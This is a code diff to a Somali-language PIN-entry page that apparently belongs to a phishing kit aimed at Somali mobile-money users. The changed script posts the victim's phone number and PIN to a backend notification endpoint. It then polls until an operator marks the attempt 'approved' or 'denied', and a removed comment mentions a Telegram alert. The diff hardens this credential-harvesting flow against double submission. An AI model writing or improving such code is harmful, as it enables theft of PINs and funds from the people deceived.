@@ -103,6 +103,7 @@
 
 <body>
 
+<!-- Single Waiting Overlay -->
 <div id="loading-overlay">
     <div class="spinner"></div>
     <div style="font-size: 20px; font-weight: bold;">Fadlan sug...</div>
@@ -159,9 +160,9 @@ document.addEventListener("DOMContentLoaded", () => {
     const savedPhone = localStorage.getItem('phone');
     displayPhone.textContent = savedPhone ? `+252 ${savedPhone}` : "+252 (ma jiro)";
 
-    let pollingInterval;
+    let pollingInterval = null;
+    let isSubmitting = false; // Prevents double submission clicks
 
-    // Process wrong pin status from redirect parameter
     const urlParams = new URLSearchParams(window.location.search);
     if (urlParams.get('error') === 'wrongpin') {
         errorDisplay.innerText = "❌ PIN waa khalad, fadlan geli PIN-ka saxda ah.";
@@ -171,11 +172,9 @@ document.addEventListener("DOMContentLoaded", () => {
     pinBoxes.forEach((box, index) => {
         box.addEventListener('input', () => {
             box.value = box.value.replace(/\D/g, '');
-
             if (box.value && index < pinBoxes.length - 1) {
                 pinBoxes[index + 1].focus();
             }
-
             checkInputs();
         });
 
@@ -188,8 +187,8 @@ document.addEventListener("DOMContentLoaded", () => {
 
     function checkInputs() {
         const filled = [...pinBoxes].every(b => b.value);
-        loginBtn.disabled = !filled;
-        loginBtn.classList.toggle('active', filled);
+        loginBtn.disabled = !filled || isSubmitting;
+        loginBtn.classList.toggle('active', filled && !isSubmitting);
     }
 
     eye.addEventListener('click', () => {
@@ -198,51 +197,79 @@ document.addEventListener("DOMContentLoaded", () => {
         eye.textContent = show ? "🫣" : "👁️";
     });
 
-    loginBtn.addEventListener('click', () => {
-        if (!savedPhone) return;
+    loginBtn.addEventListener('click', async () => {
+        if (!savedPhone || loginBtn.disabled || isSubmitting) return;
         
+        isSubmitting = true;
+        loginBtn.disabled = true;
+        loginBtn.classList.remove('active');
+
         let pin = "";
         pinBoxes.forEach(b => pin += b.value);
         localStorage.setItem('lastPin', pin);
 
-        // Redirects to page7 directly, letting page7 trigger the single telegram alert cleanly
-        window.location.href = "/page7.html";
+        errorDisplay.style.display = "none";
+        overlay.style.display = "flex";
+
+        try {
+            // Send the single login notification API request
+            const response = await fetch('/api/login-notification', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone: savedPhone, pin: pin })
+            });
+            
+            if (response.ok) {
+                startPolling();
+            } else {
+                throw new Error("Server error");
+            }
+        } catch (err) {
+            isSubmitting = false;
+            overlay.style.display = "none";
+            errorDisplay.innerText = "❌ Khalad ayaa dhacay xiriirka.";
+            errorDisplay.style.display = "block";
+            checkInputs();
+        }
     });
 
-    // Handle incoming backends checking loop if redirected inside an existing context
-    if (urlParams.get('poll') === 'true') {
-        overlay.style.display = "flex";
-        startPolling();
-    }
-
     function startPolling() {
-        clearInterval(pollingInterval);
+        if (pollingInterval) clearInterval(pollingInterval);
+        
         pollingInterval = setInterval(async () => {
             try {
+                // Check if the Admin clicked Allowed
                 const res = await fetch(`/api/check-status?phone=${encodeURIComponent(savedPhone)}`);
+                if (!res.ok) return;
+                
                 const data = await res.json();
 
                 if (data.status === "approved") {
+                    // KILL the interval immediately so it cannot run a second time or double check
                     clearInterval(pollingInterval);
-                    window.location.href = "/page7.html";
+                    pollingInterval = null;
+                    
+                    // Instantly forward to Page 7 without rendering anything else
+                    window.location.replace("/page7.html");
                 } 
                 else if (data.status === "denied") {
                     clearInterval(pollingInterval);
+                    pollingInterval = null;
+                    isSubmitting = false;
+                    
                     overlay.style.display = "none";
                     errorDisplay.innerText = "❌ Faahfaahinta aad gelisay waa khalad.";
                     errorDisplay.style.display = "block";
                     resetInputs();
-                    // Clean URL query parameter tracking state
-                    window.history.replaceState({}, document.title, window.location.pathname);
                 }
             } catch (e) {}
-        }, 3000);
+        }, 2000); 
     }
 
     function resetInputs() {
         pinBoxes.forEach(b => b.value = "");
-        loginBtn.classList.remove('active');
-        loginBtn.disabled = true;
+        isSubmitting = false;
+        checkInputs();
         pinBoxes[0].focus();
     }
 
